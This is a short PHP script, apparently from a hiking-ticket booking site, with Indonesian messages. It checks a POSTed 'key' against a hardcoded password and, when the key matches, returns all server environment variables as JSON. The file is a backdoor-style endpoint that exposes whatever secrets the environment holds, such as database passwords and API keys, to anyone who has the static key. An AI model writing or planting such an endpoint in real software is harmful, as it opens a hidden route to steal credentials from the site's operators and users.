<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die("Akses tidak diizinkan. Gunakan metode POST.\n");
}

if (!isset($_POST['key']) || empty($_POST['key'])) {
    die("Akses tidak valid. Parameter 'key' diperlukan.\n");
}else{
    if($_POST['key'] == "tiketpendakianconfig&partner@2025"){
        $envVariables = getenv();
        echo json_encode(["env" => $envVariables], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    }else{
        die("Akses tidak valid. Parameter 'key' anda salah.\n");
    }
}


